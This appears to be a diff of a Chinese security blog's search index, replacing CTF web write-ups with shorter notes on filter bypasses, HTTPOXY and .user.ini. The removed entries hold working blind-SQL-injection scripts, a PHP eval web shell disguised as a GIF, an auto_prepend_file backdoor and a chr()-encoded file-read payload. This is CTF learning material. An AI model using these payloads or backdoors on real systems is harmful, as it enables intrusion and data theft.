@@ -1,113 +1,92 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>[CISCN2019 华北赛区 Day2 Web1]Hack World</title>
-    <url>/2019/12/15/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/</url>
-    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>id为1,2时，可以分别得到一句话。id为0时，显示error，可能是因为结果为空集。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id=1</span><br><span class="line">Hello, glzjin wants a girlfriend.</span><br><span class="line">id=2</span><br><span class="line">Do you want to be my girlfriend?</span><br></pre></td></tr></table></figure><a id="more"></a>
+    <title>HTTPOXY漏洞</title>
+    <url>/2020/03/17/HTTPOXY%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<blockquote>
+</blockquote><p> Guzzle<code>&gt;=4.0.0rc2,&lt;6.2.1</code>版本受此影响 </p><table>
+<thead>
+<tr>
+<th align="center">Language</th>
+<th align="center">Environment</th>
+<th align="center">HTTP client</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">PHP</td>
+<td align="center">php-fpm mod_php</td>
+<td align="center">Guzzle 4+ Artax</td>
+</tr>
+<tr>
+<td align="center">Python</td>
+<td align="center">wsgiref.handlers.CGIHandler twisted.web.twcgi.CGIScript</td>
+<td align="center">requests</td>
+</tr>
+<tr>
+<td align="center">Go</td>
+<td align="center">net/http/cgi</td>
+<td align="center">net/http</td>
+</tr>
+</tbody></table><a id="more"></a>
 
 
-
-<p>id提交为单引号返回false，填入空格会直接显示SQL Injection Checked。这说明id除有过滤，空格被过滤了，但是单引号没过滤。</p>
-<p>尝试用Tab代替空格，发现可以，也可以用括号。</p>
-<p>接下来根据题目中的提示构造payload：</p>
-<p>union    select  flag    from    flag<br>被过滤了，直接输入一个</p>
-<p>union<br>也会被过滤</p>
-<p>这说明union也被过滤了。最后测试发现select和from，括号没有被过滤可以考虑使用函数</p>
-<p>两个大佬的脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#url是随时更新的，具体的以做题时候的为准</span></span><br><span class="line">url = <span class="string">'http://40c9be7a-36f0-4e80-94ca-d1ac9e121947.node1.buuoj.cn/index.php'</span></span><br><span class="line">data = &#123;<span class="string">"id"</span>:<span class="string">""</span>&#125;</span><br><span class="line">flag = <span class="string">'flag&#123;'</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">6</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="comment">#从可打印字符开始</span></span><br><span class="line">    begin = <span class="number">32</span></span><br><span class="line">    end = <span class="number">126</span></span><br><span class="line">    tmp = (begin+end)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> begin&lt;end:</span><br><span class="line">        print(begin,tmp,end)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        data[<span class="string">"id"</span>] = <span class="string">"if(ascii(substr((select       flag        from    flag),&#123;&#125;,1))&gt;&#123;&#125;,1,2)"</span>.format(i,tmp)</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            begin = tmp+<span class="number">1</span></span><br><span class="line">            tmp = (begin+end)//<span class="number">2</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = tmp</span><br><span class="line">            tmp = (begin+end)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    flag+=chr(tmp)</span><br><span class="line">    print(flag)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> flag[<span class="number">-1</span>]==<span class="string">'&#125;'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;&apos;&apos;</span><br><span class="line">@Modify Time      @Author</span><br><span class="line">------------      -------</span><br><span class="line">2019/10/25 19:28   laoalo</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">def a():</span><br><span class="line">    url=&quot;http://6a93b089-ace7-4ece-8334-b10dd79ac360.node3.buuoj.cn/&quot;</span><br><span class="line">    flag=&quot;Hello, glzjin wants a girlfriend.&quot;</span><br><span class="line">    final=&quot;&quot;</span><br><span class="line">    stop=0</span><br><span class="line">    for i in range(1,1290):</span><br><span class="line">         print(&quot;*&quot;*50,i,&quot;*&quot;*50)</span><br><span class="line">         stop=0</span><br><span class="line">         for j in range(32,129):</span><br><span class="line">             stop = j</span><br><span class="line">             data=&#123;&quot;id&quot;:&quot;1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))&quot; %(i,j)&#125;</span><br><span class="line">             re = requests.post(url=url,data=data).text.replace(&apos;\n&apos;,&apos;&apos;)</span><br><span class="line">             html = etree.HTML(re).xpath(&quot;//text()&quot;)</span><br><span class="line">             # print(&quot;&gt;&gt;&quot;,html)</span><br><span class="line">             if flag in html:</span><br><span class="line">                  final+=chr(j)</span><br><span class="line">                  print(&quot;\n\t\t\t\t&quot;,final)</span><br><span class="line">                  break</span><br><span class="line"></span><br><span class="line">         if stop &gt;= 128:</span><br><span class="line">            print(&quot;*&quot;*50,&quot;结束&quot;)</span><br><span class="line">            print(&quot;&gt;&gt;&quot;,final)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">       a()</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>id=1^(if((ascii(substr((select(flag)from(flag)),1,1))=102),0,1))</p>
-<p>构造payload:1^ascii(mid(database(),1,1)=98)^0</p>
-<p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</p>
+<h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><blockquote>
+<p>在CGI(RFC 3875)的模式的时候， 会把请求中的Header， 加上HTTP_ 前缀， 注册为环境变量, 所以如果你在Header中发送一个Proxy:xxxxxx, 那么PHP就会把他注册为HTTP_PROXY环境变量， 于是getenv(“HTTP_PROXY”)就变成可被控制的了. 那么如果你的所有类似的请求， 都会被代理到攻击者想要的地址，之后攻击者就可以伪造，监听，篡改你的请求了… </p>
+</blockquote>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><blockquote>
+<ul>
+<li>代码以cgi模式运行，其中使用环境变量<code>HTTP_PROXY</code></li>
+<li>信任 HTTP 客户端<code>HTTP_PROXY</code>并将其配置为代理</li>
+<li>在请求处理程序中使用的该客户端发出HTTP（与HTTPS相对）请求</li>
+</ul>
 </blockquote>
 ]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>web</tag>
-        <tag>sql盲注</tag>
-        <tag>python脚本</tag>
-      </tags>
   </entry>
   <entry>
-    <title>笔记</title>
-    <url>/2019/12/14/%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="学习笔记"><a href="#学习笔记" class="headerlink" title="学习笔记"></a>学习笔记</h1><h2 id="sql注入笔记"><a href="#sql注入笔记" class="headerlink" title="sql注入笔记"></a>sql注入笔记</h2><h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><h4 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h4><p>注释绕过空格</p><blockquote>
-<p>在MySQL中，用/<em>注释</em>/来标记注释的内容。比如SQL查询：<br>select user() from dual<br>我们用注释替换空格，就可以变成：<br>select/<strong>/user()/</strong>/from/**/dual</p>
+    <title>MD5绕过</title>
+    <url>/2020/03/17/MD5%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>比较md5加密后的值是否为0，可以把value变成数组可以绕过</p><blockquote>
+<p>因为md5加密一个数组值为null，而null==0</p>
+</blockquote>]]></content>
+  </entry>
+  <entry>
+    <title>php常用函数</title>
+    <url>/2020/03/17/php%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
+    <content><![CDATA[<h2 id="exif-imagetype"><a href="#exif-imagetype" class="headerlink" title="exif_imagetype()"></a>exif_imagetype()</h2><blockquote>
+<p><code>exif_imagetype()</code>函数判断是不是图片，这个很好绕过，在文件头添加图片头就可以了，例如<code>gif</code>的文件头<code>GIF89a</code> </p>
+</blockquote><h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h2><blockquote>
+<p>列出 参数目录 中的文件和目录</p>
+</blockquote>]]></content>
+  </entry>
+  <entry>
+    <title>过滤绕过</title>
+    <url>/2020/03/17/%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<h4 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h4><p>注释绕过空格</p><blockquote>
+<p>在MySQL中，用/**/来标记注释的内容。比如SQL查询：<br>select user() from dual<br>我们用注释替换空格，就可以变成：<br>select/**/user()/**/from/**/dual</p>
 </blockquote><a id="more"></a>
 
-<p> 括号绕过空格 </p>
+<p>括号绕过空格 </p>
 <blockquote>
 <p>空格被过滤，但括号没有被过滤，可通过括号绕过。<br>我的经验是，在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。<br>括号绕过空格的方法，在time based盲注中，是屡试不爽的。<br>举例说明，我们有这样的一条SQL查询：<br>select user() from dual where 1=1 and 2=2<br>观察到user()可以算值，那么user()两边要加括号，变成：<br>select(user())from dual where 1=1 and 2=2;<br>继续，1=1和2=2可以算值，也加括号，去空格，变成：<br>select(user())from dual where(1=1)and(2=2)</p>
 <p><a href="http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109" target="_blank" rel="noopener">http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109</a>))<br>这条语句是猜解user()第二个字符的ascii码是不是109，若是109，则页面加载将延迟。它：</p>
 <p>1) 既没有用到逗号、大小于符号<br>2) 也没有使用空格</p>
 </blockquote>
 <p>可尝试Tab替代空格</p>
+<h4 id="绕过特殊字符过滤"><a href="#绕过特殊字符过滤" class="headerlink" title="绕过特殊字符过滤"></a>绕过特殊字符过滤</h4><blockquote>
+<p>可以用chr()函数绕过</p>
+</blockquote>
 ]]></content>
-      <categories>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>sql</tag>
-      </tags>
   </entry>
   <entry>
-    <title>[RoarCTF 2019]Easy Calc</title>
-    <url>/2019/12/14/RoarCTF-2019-Easy-Calc/</url>
-    <content><![CDATA[<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>1.知识点<br>    PHP的字符串解析特性<br>这是别人对PHP字符串解析漏洞的理解，<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><a id="more"></a>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/news.php?%20news[id%00=42&quot;+AND+1=0–</span><br></pre></td></tr></table></figure>
-
-<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>
-<p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
-<blockquote>
-<p>1.删除空白符</p>
-</blockquote>
-<blockquote>
-<p>2.将某些字符转换为下划线（包括空格）</p>
-</blockquote>
-<p>我的理解：<br>假如waf不允许num变量传递字母：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话</span><br></pre></td></tr></table></figure>
+    <title>文件上传</title>
+    <url>/2020/03/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<blockquote>
+<ul>
+<li><code>gif</code>的文件头<code>GIF89a</code> </li>
+</ul>
+</blockquote><h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>PHP会在每个目录下扫描INI文件，我们可以通过.user.ini文件来实现隐藏后门的效果</p><p>在.user.ini中可以识别PHP_INI_PERDIR和PHP_INI_USER模式的INI设置<br>关于PHP_INI_*一共有四种：</p><a id="more"></a>
 
 
-<p>那么我们可以在num前加个空格：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/index.php? num = aaaa</span><br></pre></td></tr></table></figure>
-
-
-<p>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
-<p>1.2  waf<br>原来waf我们是看不见的，我一直以为题里的源码，就是waf了。并且，waf并不是说，题目是用php写的，那么waf就一定是用php写的。也正因如此，这题的waf才会无法识别“ num”和“num”其实是一样的。</p>
-<p>1.3 scandir()<br>列出 参数目录 中的文件和目录，要不然我们怎么知道flag在哪。</p>
-<p>2.应用<br>存在高危漏洞，很明显传递函数，拿flag。<br>首先我们要先扫根目录下的所有文件，也就是是scandir(“/“),但是“/”被过滤了，所以我们用chr(“47”)绕过,发现flagg文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[SUCTF 2019]CheckIn</title>
-    <url>/2019/12/14/SUCTF-2019-CheckIn/</url>
-    <content><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>​    打开后是上传页面，测试后不知道怎么绕过</p><p>发现是 <code>exif_imagetype()</code>函数判断是不是图片，这个很好绕过，在文件头添加图片头就可以了，例如<code>gif</code>的文件头<code>GIF89a</code> </p><a id="more"></a>
-
-<p>然后尝试在上传图片马</p>
-<p>提示<code>&lt;? in contents</code>  说明不能有&lt;?   </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language=&apos;php&apos;&gt;</span><br><span class="line"></span><br><span class="line">@eval($_POST[&apos;pass&apos;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>绕过</p>
-<p>然后就不知道怎么办了，看了看大佬的wp</p>
-<p>发现有.user.ini这个东西</p>
-<p>在PHP中有个很有趣的东西叫.user.ini，有点类似.htaccess文件，PHP会在每个目录下扫描INI文件，我们可以通过.user.ini文件来实现隐藏后门的效果</p>
-<p>在.user.ini中可以识别PHP_INI_PERDIR和PHP_INI_USER模式的INI设置<br>关于PHP_INI_*一共有四种：</p>
 <blockquote>
 <p>PHP_INI_USER 可在用户脚本以及.user.ini中设定</p>
 </blockquote>
@@ -123,385 +102,156 @@
 <p>auto_prepend_file</p>
 <p>该配置项会让php文件在执行前先包含一个指定的文件，通过这个配置项，我们就可以来隐藏自己的后门</p>
 <p>.user.ini</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=test.jpg</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=test.jpg</span><br></pre></td></tr></table></figure>
 
-<p>test.jpg</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&apos;php&apos;&gt;</span><br><span class="line"></span><br><span class="line">@eval($_POST[&apos;pass&apos;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后菜刀连接就行</p>
-<p>出题人故意在上传目录中设置一个可以访问的php文件，这样我们才能包含上传的图片代码，但在现实例子中较为少见。</p>
-<p>综上所述.user.ini的利用条件如下：</p>
+<p>.user.ini利用条件</p>
 <blockquote>
 <p>服务器脚本语言为PHP</p>
 <p>服务器使用CGI／FastCGI模式<br>上传目录下要有可执行的php文件<br>从这来看.user.ini要比.htaccess的应用范围要广一些，毕竟.htaccess只能用于Apache</p>
 <p>但仔细推敲我们就会感到“上传目录下要有可执行的php文件”这个要求在文件上传中也比较苛刻，应该没有天才开发者会把上传文件放在主目录或者把php文件放在上传文件夹。</p>
-<p>但也不是全无办法，如果我们根据实际情况配合其他漏洞使用可能会有奇效，前段时间我遇到一个CMS对上传时的路径没有检测../，因此导致文件可被上传至任意目录，这种情况下我们就很有可能可以利用.user.ini</p>
+<p>但也不是全无办法，如果我们根据实际情况配合其他漏洞使用可能会有奇效，当对上传时的路径没有检测../时，因此导致文件可被上传至任意目录，这种情况下我们就很有可能可以利用.user.ini</p>
 </blockquote>
 ]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>web</tag>
-        <tag>upload</tag>
-      </tags>
   </entry>
   <entry>
-    <title>[强网杯 2019]高明的黑客</title>
-    <url>/2019/12/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
-    <content><![CDATA[<h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p>下载代码后一脸懵逼<br>菜逼只能看大佬的<a href="https://blog.csdn.net/a3320315/article/details/102945940" target="_blank" rel="noopener">writerup</a><br>Php文件有很多shell都没用，所以我们猜测这几千个php文件中肯定含有可以使用的shell，我们只有写脚本去试了。<br>python代码</p><a id="more"></a>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">'开始时间：  '</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r"D:/soft/phpstudy/PHPTutorial/WWW/src/"</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>								<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>											 <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span><span class="params">(file)</span>:</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">'trying   '</span>+file+ <span class="string">'     '</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = list(re.findall(<span class="string">'\$_GET\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">            posts = list(re.findall(<span class="string">'\$_POST\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1/src/'</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:									<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">'?%s='</span>%a+<span class="string">"echo 'xxxxxx';"</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">"echo 'xxxxxx';"</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:													<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">'找到了利用文件： '</span>+file+<span class="string">"  and 找到了利用的参数：%s"</span> %param)</span><br><span class="line">        print(<span class="string">'结束时间：  '</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>web</tag>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[HCTF 2018]admin</title>
-    <url>/2019/12/14/HCTF-2018-admin/</url>
-    <content><![CDATA[<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>登录后在change页面发现提示</p><blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://github.com/woadsl1234/hctf_flask/ </span><br></pre></td></tr></table></figure>
-</blockquote><p>看了<a href="https://www.anquanke.com/post/id/164086#h3-13" target="_blank" rel="noopener">wp</a>后，用的是Unicode欺骗<br>我们可以发现，不管是login、register还是change页面，只要是关于session[‘name’]的操作，都先用了strlower函数将name转成小写，但是python中有自带的转小写函数lower，这里重写了一个，可能有点猫腻，于是找到strlower函数的定义</p><a id="more"></a>
-
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line"><span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>
-
-
-<p>这里用到了nodeprep.prepare函数，而nodeprep是从twisted模块中导入的from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep，在requirements.txt文件中，发现这里用到的twisted版本是Twisted==10.2.0，而官网最新版本为19.2.0(2019/6/2)，版本差距这么大，估计是存在什么漏洞，</p>
-<p>这里原理就是利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。<br>所以当我们用ᴬdmin注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成Admin，我们用ᴬdmin进行登录，可以看到index页面的username变成了Admin，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可。</p>
-<p>我们发现在改密码函数代码里，也用到了nodeprep.prepare函数，也就是说，我们在这里改密码的话，先会把username改为admin，从而改掉admin的密码。</p>
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>Writeup</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[SUCTF 2019]EasySQL</title>
-    <url>/2019/12/14/SUCTF-2019-EasySQL/</url>
-    <content><![CDATA[<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>简单测试了下，发现有三种回显，分别位’nonono’，空以及返回array<br>实在做不出来，就看了大佬的<a href="https://www.jianshu.com/p/5644f7c39c68" target="_blank" rel="noopener">wp</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    include_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">    $post = array();</span><br><span class="line">    $get = array();</span><br><span class="line">    global $MysqlLink;</span><br><span class="line"></span><br><span class="line">    //GetPara();</span><br><span class="line">    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);</span><br><span class="line">    if(!$MysqlLink)&#123;</span><br><span class="line">        die(&quot;Mysql Connect Error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    if(!$selectDB)&#123;</span><br><span class="line">        die(&quot;Choose Database Error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    foreach ($_POST as $k=&gt;$v)&#123;</span><br><span class="line">        if(!empty($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($_GET as $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //die();</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    if(isset($post[&apos;query&apos;]))&#123;</span><br><span class="line">        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;</span><br><span class="line">        //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]));</span><br><span class="line">        if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]))&#123;</span><br><span class="line">            //echo $post[&apos;query&apos;];</span><br><span class="line">            die(&quot;Nonono.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(strlen($post[&apos;query&apos;])&gt;40)&#123;</span><br><span class="line">            die(&quot;Too long.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        do&#123;</span><br><span class="line">            if($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                while($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;while(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><a id="more"></a>
-
-
